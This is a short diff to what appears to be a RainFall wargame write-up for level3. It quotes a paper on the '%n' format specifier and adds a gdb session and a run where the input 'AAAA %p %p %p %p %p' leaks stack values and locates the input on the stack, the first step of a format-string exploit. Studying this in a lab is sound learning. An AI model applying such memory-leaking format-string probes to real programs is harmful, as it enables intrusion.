@@ -43,3 +43,19 @@ int main()
 
 "the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack."
 https://cs155.stanford.edu/papers/formatstring-1.2.pdf
+
+
+
+```
+(gdb) run <<< "AAAA %p %p %p %p %p"
+
+esp after fgets
+
+(gdb) f
+0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff4f0:	0x41414141	0x20702520	0x25207025	0x70252070
+
+level3@RainFall:~$ ./level3
+AAAA %p %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
+```
